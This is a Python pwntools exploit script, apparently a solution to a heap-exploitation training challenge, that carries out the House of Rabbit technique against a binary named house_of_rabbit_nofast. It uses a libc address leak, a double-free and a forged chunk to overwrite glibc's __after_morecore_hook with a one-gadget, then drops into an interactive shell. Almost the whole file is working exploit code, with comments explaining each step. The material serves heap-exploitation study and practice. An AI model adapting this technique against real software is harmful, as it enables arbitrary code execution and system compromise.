#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_rabbit_nofast', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+187

b *main+298

b *main+396
b *main+463

b *main+575
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "amend age" option; send new value.
def amend_age(age):
    io.send(b"3")
    io.sendafter(b"age: ", f"{age}".encode())
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- PREPARE A FAKE CHUNK -=-=-=

# Craft a fake chunk using the "age" field.
# Set its prev_inuse flag to avoid backward consolidation.
# This fake chunk has a size of 0, so it acts as its own forward consolidation guard.
age = 1

io.sendafter(b"age: ", f"{age}".encode())
io.recvuntil(b"> ")


# =-=-=- INCREASE MMAP THRESHOLD -=-=-=

# Before we can increase the main arena's system_mem value, we must increase the mmap_threshold.
# We do this by requesting then freeing a chunk with size beyond the mmap threshold.
mem = malloc(0x5fff8, b"Y"*8) # Allocated via mmap().
free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size.


# =-=-=- INCREASE SYSTEM_MEM -=-=-=

# Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them
# from a heap, rather than via mmap().
# This in turn will increase the total memory checked out from the kernel, which is tracked by
# an arena's system_mem field.
mem = malloc(0x5fff8, b"Z"*8)


# =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=

# We can't request fast-sized chunks!
# Instead, forge one on the heap using vestigial malloc metadata, then free it via a dangling pointer.

# Prepare dangling pointer.
chunk_A = malloc(0x88, b"A"*8)
dangling_pointer = malloc(0x88, b"B"*8) # Dangling pointer.

free(chunk_A)
free(dangling_pointer)

# Coerce a 0x20 size field onto the heap, lined up with the dangling pointer.
chunk_C = malloc(0xa8, b"C"*8)
chunk_D = malloc(0x88, b"D"*8) # Guard against top consolidation.

free(chunk_C)
chunk_E = malloc(0x88, b"E"*8) # Remainder chunk_C, leaving a free 0x20 chunk.

# Free chunk E to consolidate it with the unsorted 0x20 chunk, avoiding unlinking problems later.
free(chunk_E)

# Consolidate everything with the top chunk, we need to request the space overlapping the 0x20 chunk.
free(chunk_D)

# Free the dangling pointer, the size field at that location is 0x20, vestigial malloc metadata.
free(dangling_pointer) # Double-free.

# Request a chunk overlapping the free 0x20 chunk and overwrite its fd with the address
# of our fake chunk.
chunk_F = malloc(0x88, b"F"*8)
overlap = malloc(0x88, pack(elf.sym.user))


# =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-=

# Free the 0x60000 chunk, which is large enough to trigger malloc_consolidate().
# Previously we did this by requesting then freeing a normal chunk bordering the top.
free(mem)


# =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-=

# Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it,
# then requesting a chunk larger than the fake chunk.
# This part is where the unsortedbin size sanity check would catch us if we hadn't increased system_mem.
amend_age(0x80001)
malloc(0x80008, b"G"*8)

# Increase the fake chunk size so that it can reach the after_morecore hook.
# Making this value too large will fail the size sanity check during unsortedbin allocation
# of the following chunk. It can also trigger segfaults or busfaults when the remaindering code
# attempts to update the prev_size field of the succeeding chunk.
distance = (libc.sym.__after_morecore_hook - 0x20) - elf.sym.user
amend_age(distance + 0xa1) # Leave just enough space in the remainder to request a small chunk overlapping the hook.


# =-=-=- OVERWRITE HOOK -=-=-=

# The next request is serviced by our fake chunk.
# Request a large chunk to bridge the gap between the fake chunk and the hook.
# We can't target the free hook this time because we can only write 8 bytes into chunk user data
# rather than 16, meaning we can't make up the gap between the start of a chunk overlapping
# the free hook and the free hook itself.
# The malloc hook gets clobbered too early by inline metadata, and we don't have enough control
# over __morecore arguments, nor does it satisfy any one-gadget constraints.
# However, we can trigger the after_morecore hook and it satisfies a one-gadget constraint.
malloc(distance, b"H"*8)

# The next request is serviced by the fake chunk's remainder and overlaps the after_morecore hook.
# Use it to overwrite the after_morecore hook with the address of a one-gadget.
malloc(0x88, pack(libc.address + 0x3ff5e)) # rax == NULL

# Request enough space to trigger top chunk extension. Remember that there's a 0x60000-sized chunk in
# the unsortedbin at this point so we need to request more than that, but no more than the mmap threshold.
malloc(0x60008, b"")

# =============================================================================

io.interactive()